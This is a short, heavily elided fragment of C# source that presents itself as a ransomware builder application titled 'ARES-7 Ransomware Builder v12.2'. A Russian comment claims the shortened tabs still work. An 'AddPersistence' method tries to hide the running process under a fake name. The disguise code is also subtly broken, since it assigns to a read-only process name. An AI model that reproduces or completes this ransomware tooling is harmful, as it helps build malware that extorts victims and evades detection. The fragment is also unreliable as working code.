...
namespace RansomwareBuilder
{
    public partial class Form1 : Form
    {
        ...
        {
            this.Text = "ARES-7 Ransomware Builder v12.2";
        ...
        // ============================================================
        // ВКЛАДКИ (СОКРАЩЕНЫ ДЛЯ ЭКОНОМИИ, НО РАБОЧИЕ)
        // ============================================================
...
static void AddPersistence()
{
    ...
    try
    {
        ...
        {{
            try {{ Console.Title = FAKE_NAME; Process.GetCurrentProcess().ProcessName = FAKE_NAME; }}
            catch {{ }}
        }}
